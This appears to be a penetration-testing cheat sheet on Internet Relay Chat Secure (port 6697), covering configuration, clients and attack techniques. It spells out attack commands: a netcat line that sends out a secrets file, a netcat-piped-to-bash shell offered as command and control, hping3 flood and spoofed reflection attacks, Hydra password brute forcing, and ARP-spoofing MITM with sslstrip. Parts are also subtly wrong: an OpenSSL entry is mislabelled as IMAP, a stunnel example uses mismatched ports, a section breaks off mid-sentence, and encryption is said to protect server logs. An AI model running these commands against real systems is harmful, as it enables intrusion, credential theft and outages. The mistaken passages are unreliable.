# Index
- [[Ports, Protocols, and Services]]
	- [[P6667 IRC]]

# Internet Relay Chat Secure (IRCS)

- **Port Number:** 6697 (commonly used)
- **Protocol:** TCP
- **Service Name:** Internet Relay Chat Secure (IRCS)
- **Defined in:** Not officially standardized but widely implemented

Internet Relay Chat Secure (IRCS) is a secure version of the Internet Relay Chat (IRC) protocol. IRC is a real-time text communication protocol that facilitates chat sessions between users in a client-server model, typically within chat rooms (channels). IRCS extends the basic functionality of IRC by adding Transport Layer Security (TLS) encryption, providing confidentiality and integrity to communications.

## Overview of Features

- **Secure Communication:** IRCS uses SSL/TLS to encrypt communications between IRC clients and servers, protecting against eavesdropping and man-in-the-middle attacks.
  
- **Port Usage:** Typically operates over port 6697, though other ports may be used depending on server configuration.

- **Compatibility:** Backward compatible with standard IRC, allowing clients to connect to non-SSL servers if needed (though not recommended for security reasons).

- **Channel-Based Communication:** IRCS supports the creation of multiple channels, where users can join, chat, and leave as needed.

- **User Authentication:** Many IRCS servers support user authentication mechanisms, such as NickServ, to prevent impersonation and manage access.

- **Message Logging and Archiving:** Although IRCS servers can log and archive messages, encryption ensures that logs are only readable by authorized parties.

- **Server-to-Server Links:** Supports secure connections between servers, enabling the formation of larger, interconnected IRC networks.

## Typical Use Cases

- **Secure Group Communication:** Used by groups and communities requiring secure, real-time communication, particularly where privacy is a concern.

- **Anonymized Chat:** Often used in environments where anonymity is valued, such as by activists or in privacy-conscious communities.

- **Collaboration and Coordination:** Facilitates coordination among team members in various projects, especially in open-source development communities.

- **Incident Response:** Utilized by security teams for coordinating responses to security incidents in real-time, with the benefit of encrypted communication.

## How IRCS Protocol Works

1. **Connection Establishment:**
   - **Step 1:** The client initiates a TCP connection to the server on port 6697.
   - **Step 2:** The client and server perform a TLS handshake to establish a secure encrypted channel.
   - **Step 3:** Once the handshake is successful, the encrypted communication channel is established, and all subsequent data is encrypted.

2. **User Authentication:**
   - **Step 4:** The client may authenticate with the server using a password or an authentication service like NickServ.
   - **Step 5:** If authentication is successful, the client is granted access to the server and can proceed to join channels.

3. **Joining Channels:**
   - **Step 6:** The client sends a command (e.g., `JOIN #channel`) to join a specific channel.
   - **Step 7:** The server processes the request and, if the client has the necessary permissions, joins them to the channel.
   - **Step 8:** The client begins receiving messages from the channel, and can send messages that are relayed to all other members of the channel.

4. **Sending and Receiving Messages:**
   - **Step 9:** Messages sent by the client are encrypted and transmitted to the server.
   - **Step 10:** The server decrypts the messages, checks permissions, and broadcasts them to other clients in the channel.

5. **Leaving Channels and Disconnecting:**
   - **Step 11:** The client can leave a channel by sending the `PART #channel` command.
   - **Step 12:** To disconnect, the client sends a `QUIT` command, which terminates the session and closes the connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` initiates a secure connection to `<target_ip>`:6697.
- **Server:** `<target_ip>` completes TLS handshake and establishes a secure communication channel.
- **Client:** `<attack_ip>` joins `#secure_channel` and participates in encrypted chat.

# Additional Information

## Security Considerations
- **End-to-End Encryption:** While IRCS encrypts communication between the client and server, messages are typically decrypted at the server before being relayed to other clients. End-to-end encryption is not inherently provided, meaning server operators could potentially read messages.

- **Certificate Validation:** Ensuring that the server presents a valid TLS certificate is crucial to prevent man-in-the-middle attacks. Some clients may not properly validate certificates, which can be exploited.

- **Anonymity:** While IRCS can help protect the privacy of users, it does not inherently anonymize them. Users should combine IRCS with other privacy tools like Tor to enhance anonymity.

## Alternatives
- **Matrix:** An open standard for secure, decentralized communication that offers end-to-end encryption, often seen as a modern alternative to IRC/IRCS.
  
- **Discord with TLS:** While not an open standard, Discord provides secure, encrypted communication with additional features like voice and video chat.

- **Signal Groups:** For those needing end-to-end encrypted group chats with mobile support, Signal offers a secure alternative.

## Modes of Operation
- **Public Channels:** Open to anyone, these channels are often used for general discussions.
  
- **Private Channels:** Restricted to specific users, often requiring an invitation or password.

- **Server-to-Server (S2S) Connections:** Servers can establish encrypted links to form larger networks, enabling cross-server communication in a secure manner.

## Advanced Usage
- **Bouncer Configuration:** Some users employ "bouncers" (e.g., ZNC) to maintain a persistent connection to an IRCS server, allowing them to reconnect without missing messages.

- **Automated Bots:** IRCS supports the creation of bots that can automate tasks, such as moderating channels, providing information, or integrating with other services.

## Configuration Files

Configuration of IRCS services typically involves setting up an IRC daemon (ircd) with SSL/TLS support. The following is an example based on popular IRC servers:

1. **UnrealIRCd Configuration:**
  - **File Location:** `/etc/unrealircd/unrealircd.conf`
  - **Configuration Example:**
    ```bash
    listen *:6697 {
        options {
            ssl;
        };
    };
    tls-options {
        certificate "/etc/ssl/certs/ircd.crt";
        key "/etc/ssl/private/ircd.key";
        dhparams "/etc/ssl/private/dhparams.pem";
    };
    ```
  - **Key Settings:**
    - `ssl`: Enables SSL/TLS on the specified port.
    - `certificate`: Path to the SSL certificate.
    - `key`: Path to the SSL private key.
    - `dhparams`: Diffie-Hellman parameters for stronger encryption.

2. **InspIRCd Configuration:**
  - **File Location:** `/etc/inspircd/inspircd.conf`
  - **Configuration Example:**
    ```bash
    <bind address="*" port="6697" type="clients">
        <ssl enabled="yes" certfile="server.crt" keyfile="server.key" dhfile="dhparams.pem">
    </bind>
    ```
  - **Key Settings:**
    - `port`: Specifies the port number (6697 for IRCS).
    - `certfile`: Path to the SSL certificate.
    - `keyfile`: Path to the SSL private key.
    - `dhfile`: Diffie-Hellman parameters file for strong encryption.

## Potential Misconfigurations

1. **Weak SSL/TLS Configurations:**
   - **Risk:** Using outdated or weak SSL/TLS configurations (e.g., SSLv3, weak ciphers) can leave the IRCS service vulnerable to attacks like POODLE or BEAST.
   - **Exploitation:** Attackers can intercept or decrypt communications by exploiting known weaknesses in outdated SSL/TLS protocols.

2. **Improper Certificate Management:**
   - **Risk:** Using self-signed certificates or improperly managed certificates can lead to users ignoring warnings, making them vulnerable to man-in-the-middle attacks.
   - **Exploitation:** Attackers can impersonate the server or intercept traffic if users are tricked into accepting an invalid certificate.

3. **Open IRCS Relays:**
   - **Risk:** Misconfigured servers may act as open relays, allowing unauthorized users to use the server to send messages or spam.
   - **Exploitation:** Attackers can use the server to launch spam campaigns or distribute malware, potentially leading to blacklisting or abuse reports.

4. **Insecure Server-to-Server Links:**
   - **Risk:** If server-to-server (S2S) connections are not properly secured, attackers could intercept or disrupt communications between servers.
   - **Exploitation:** Attackers could potentially manipulate or block messages being relayed between servers, disrupting the entire network.

## Default Credentials

IRCS does not typically rely on default credentials for basic operation, but user authentication (e.g., NickServ) may involve creating and managing user credentials. It is important to ensure that:

# Interaction and Tools

## [[IRC]]
- **Connect to IRC Server:** Connects to an IRC server at the specified address and port.
	```bash
	/connect <target_ip> <target_port>
	```
- **Connecting to an IRCS Server:** Connects to the IRCS server on port 6697 with SSL/TLS encryption.
	```bash
	/server -ssl <target_ip> 6697
	```
- **Set User Information:** Sends user information to the server after connecting.
	```bash
	USER <username> <hostname> <servername> <realname>
	```
- **Disconnect From Server with Optional Message:** Disconnects from the IRC server with an optional message.
	```bash
	/quit <message>
	```
- **List Channels:** Lists all available channels on the server.
	```bash
	/list
	```
- **Join Channel:** Joins a specified IRC channel.
	```bash
	/join #<channel_name>
	```
- **Leave Channel:**
	```bash
	/part #<channel_name>
	```
- **Change User Nickname:** Registers or changes the client’s nickname.
	```bash
	/nick <nickname>
	```
- **Send Message to Channel:** Sends a message to all users in the specified channel.
	```bash
	/msg #channelname :message
	```
- **Send Private Message:**
	```bash
	/msg <nickname> <message>
	```
- **Set or Display Channel Mode:** Sets a channel to moderated mode, where only users with voice or operator status can speak.
	```bash
	/mode <channel> <modes>
	```
- **Setting User Modes:** Hides the user's IP address from other users (depending on server settings).
	```bash
	/mode <nickname> +x
	```
- **Grant Operator Status to User in Channel**
	```bash
	/op <nickname>
	```
- **Kicks User From Channel:**
	```bash
	/kick <nickname> <optional_message>
	```
- **Ban User from Channel:**
	```bash
	/ban <nickname>
	```

## Tools

### [[Telnet]]
- **Connect to IRC Server:**
	```bash
	telnet <target_ip> 6697
	NICK <nickname>
	USER <username> <hostname> <servername> :<realname>
	JOIN #<channel_name>
	PRIVMSG #<channel_name> :<message>
	```

### [[Stunnel]]
- **Create a Secure Tunnel:** Creating secure tunnels for services, allowing you to connect to them via tools like Telnet or NetCat.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:6697
    ```
- **Telnet via Stunnel:** Creates a secure tunnel using Stunnel and then connects to it via Telnet.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:6697
    telnet 127.0.0.1 6697
    ```

### [[OpenSSL]]
- **Connect TLS Encrypted Interaction IMAP:** Establishes a secure connection to an IMAPS server using OpenSSL, allowing manual interaction with the IMAP service.
	```bash
	openssl s_client -connect <target_ip>:6697
	openssl s_client -connect <target_ip>:6697 -starttls
	```
- **Check SSL/TLS Certificate:**
	```bash
	openssl s_client -connect <target_ip>:6697 -showcerts
	```

### [[IRSSI]]
- **Connect to IRC Server:**
	```bash
	irssi -c <target_ip> -p 6697 -n <nickname> -z
	```

### [[WeeChat]]
- **Connect to an IRC Server:**
	```bash
	weechat --connect=ssl://<target_ip>:6697
	```

### [[HexChat]]
- **Connect to an IRC Server:**
	```bash
	hexchat --url=ircs://<target_ip>:6697
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 6697"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 6697
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 6697
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 6697 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 6697
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 6697 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:6697
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 6697
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:6697
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:6697
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 6697
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 6697
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 6697
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Certificate Information Gathering
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:6697 -showcerts
    ```
- **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 6697"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### SSL Strip Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    
    sslstrip -l 6697
    ```
- **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

## Lateral Movement, Pivoting, and Tunnelling

### Tunneling IRC Over SSH
- **Tool:** [[SSH]]
	```bash
	ssh -L 6667:<server_ip>:6667 <user>@<ssh_server>
	```
- **Description:** Secure IRC communication by tunneling it over SSH.

### Using IRC as a Command and Control (C2) Channel
- **Tool:** [[IRC]]
    ```bash
    nc -l -p 6667 | bash
    ```
- **Description:** Sets up an IRC bot or script to relay commands across the network, enabling lateral movement.

## Defense Evasion

### Cloaking Using Proxies
- **Tool:** [[Proxychains]]
    ```bash
    proxychains irssi -c irc.example.com -p 6667
    ```
- **Description:** Connects to IRC through multiple proxies to hide the attacker’s origin.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ircs://<target_ip> -s 6697 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 6697 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 6697 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 6697 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### SSL/TLS Handshake Flood
- **Tool:** [[HPing3 Cheat Sheet]]]
     ```bash
     hping3 <target_ip> -p 6697 -S --flood --rand-source -c 1000
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 6697 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 6697 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 6697 <target_ip>
	```
- **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

### SSL/TLS Downgrade Attack
- **Tool** [[OpenSSL]]
	```bash
	openssl s_client -connect <target_ip>:6697 -tls1
	openssl s_client -connect <target_ip>:6697 -tls1_0
	```
- **Description:** Attempts to connect to a server using a deprecated protocol version to check for vulnerabilities.

### SSL/TLS Stripping
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
     ```bash
     bettercap -iface <interface> -T <target_ip> --proxy
     
     sslstrip -l 6697
     ```
- **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

# Resources

|**Website**|**URL**|
|-|-|
|IRC RFC (1459)|https://tools.ietf.org/html/rfc1459|
|HexChat Official Site|https://hexchat.github.io/|
|WeeChat Documentation|https://weechat.org/doc/|
|irssi Homepage|https://irssi.org/|
|ZNC Official Site|https://znc.in/|
|OpenSSL Documentation|https://www.openssl.org/docs/man1.1.1/man1/|
|Nmap SSL/TLS Scripts|https://nmap.org/nsedoc/categories/ssl.html|
|Wireshark Official Site|https://www.wireshark.org/|
|hping3 Manual|http://www.hping.org/manpage.html|
|Bettercap Official Site|https://www.bettercap.org/|